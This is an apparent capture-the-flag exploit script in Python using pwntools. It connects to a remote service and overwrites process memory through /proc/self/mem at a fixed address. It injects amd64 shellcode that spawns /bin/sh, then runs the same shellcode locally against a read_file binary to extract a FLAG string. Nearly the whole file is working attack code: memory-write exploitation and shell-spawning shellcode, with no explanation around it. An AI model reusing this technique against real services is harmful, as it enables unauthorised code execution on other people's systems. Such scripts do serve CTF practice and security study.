import os
import paramiko
from base64 import b64encode
from pwn import *
import sys
import re
import os

#ssh = paramiko.SSHClient()
#ssh.connect(sys.argv[1], port=sys.argv[2], username='hacker', password='hacker')

context.arch = 'amd64'

io = remote(sys.argv[1], sys.argv[2])
#io = process('../deploy/write_file')
#gdb.attach(io)

target = 0x4012af

shellcode = '''
mov rax, %d
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
syscall
''' % u64('/bin/sh\0')

io.sendlineafter(': ', '/proc/self/mem')
io.sendlineafter(': ', str(target))
io.sendlineafter(': ', asm(shellcode))

payload = asm(shellcode)
payload = b64encode(payload).decode()

command = 'echo %s | base64 -d | ../deploy/read_file 3< /flag' % payload
os.system(command)
'''
stdin, stdout, stderr = ssh.exec_command('echo %s | base64 -d | payload 3< /flag' % payload)

output = stdout.read()
output = io.recv()
flag = re.findall('^FLAG{[0-9a-zA-Z_]+}$', output)[0]
print(flag)
'''
